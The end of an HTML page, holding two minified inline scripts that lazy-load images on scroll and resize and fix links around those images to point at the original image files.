        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>

</html>
